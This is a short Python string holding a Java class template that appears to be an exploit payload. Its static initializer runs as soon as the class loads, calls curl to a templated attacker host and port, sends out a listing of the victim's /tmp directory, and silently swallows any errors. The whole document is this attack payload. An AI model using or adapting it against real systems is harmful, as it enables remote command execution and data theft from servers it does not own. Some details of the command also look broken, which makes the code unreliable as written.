java_echo = """
//javac Echo.java
import java.lang.Runtime;
import java.lang.Process;

public class Echo {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pc = rt.exec("curl http://{{ip}}:{{port}} -d $(ls /tmp | tr '\\n' ..)");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
"""
